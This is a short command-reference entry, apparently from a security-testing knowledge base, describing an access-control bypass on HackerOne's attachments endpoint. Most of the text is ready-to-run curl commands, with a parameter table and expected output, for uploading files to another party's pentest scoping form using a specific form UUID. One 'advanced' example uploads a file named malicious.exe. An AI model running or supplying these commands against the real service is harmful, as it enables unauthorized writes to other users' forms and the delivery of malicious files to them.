---
data: >-
  curl -X POST https://hackerone.com/attachments -H "Cookie:
  your_session_cookies" -F "tracer=FORM_ID" -F "context_type=PentestOpportunity"
  -F "file=@filename.png"
tags:
  - http
  - upload
  - bypass
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:13.635Z'
id: db71aefc-d3bc-41f1-b234-7a020729e344
verified: false
validated: true
submitted: true
---
# curl-upload-attachment-to-scoping-form

## Command

```bash
curl -X POST https://hackerone.com/attachments \
  -H "Cookie: your_session_cookies" \
  -F "tracer=989953fa-5635-43c9-b584-48736d224b15" \
  -F "context_type=PentestOpportunity" \
  -F "file=@test-file.png"
```

## Description

This curl command performs an unauthorized file upload to a HackerOne pentest scoping form by targeting the /attachments endpoint with a known form ID (tracer). It exploits missing access controls, requiring only authentication cookies.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `-H "Cookie: ..."` | Session cookies from authenticated account | Yes |
| `-F "tracer=..."` | Form ID (UUID) identifying the target scoping form | Yes |
| `-F "context_type=PentestOpportunity"` | Specifies the attachment context | Yes |
| `-F "file=@..."` | Path to the file being uploaded | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://hackerone.com/attachments -H "Cookie: session=abc123" -F "tracer=989953fa-5635-43c9-b584-48736d224b15" -F "context_type=PentestOpportunity" -F "file=@test.png"
```

### Advanced Usage

```bash
curl -X POST https://hackerone.com/attachments -H "Cookie: session=abc123" -H "Content-Type: multipart/form-data" -F "tracer=FORM_ID" -F "context_type=PentestOpportunity" -F "file=@malicious.exe" --verbose
```

## Expected Output

Successful execution returns an HTTP 200/201 response with JSON containing the attachment ID, e.g., {"id": "attach_123", "url": "..."}. Errors indicate invalid cookies or form ID.

## Related

- [[procedures/Upload-Attachment-to-Foreign-Form]]
